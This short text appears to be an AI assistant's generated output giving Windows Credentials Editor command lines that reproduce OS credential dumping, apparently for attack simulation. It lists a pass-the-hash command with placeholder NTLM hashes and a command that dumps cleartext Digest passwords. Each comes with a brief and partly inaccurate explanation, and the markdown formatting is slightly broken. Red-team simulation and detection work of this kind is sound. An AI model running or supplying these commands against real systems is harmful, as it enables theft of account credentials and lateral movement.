Based on the provided documentation and attack description, I will generate realistic command lines using only the Windows Credentials Editor (WCE) tool to reproduce the OS Credential Dumping attack behavior.

Here are the command lines:
```
Command:`wce -s auser:adomain:99999999999999999999999999999999:99999999999999999999999999999999`

This command changes NTLM credentials associated with the current logon session, simulating an adversary's attempt to dump credentials.

Command:`wce -w`
```
This command dumps cleartext passwords stored by the Digest Authentication package, allowing an attacker to obtain account login and credential material.
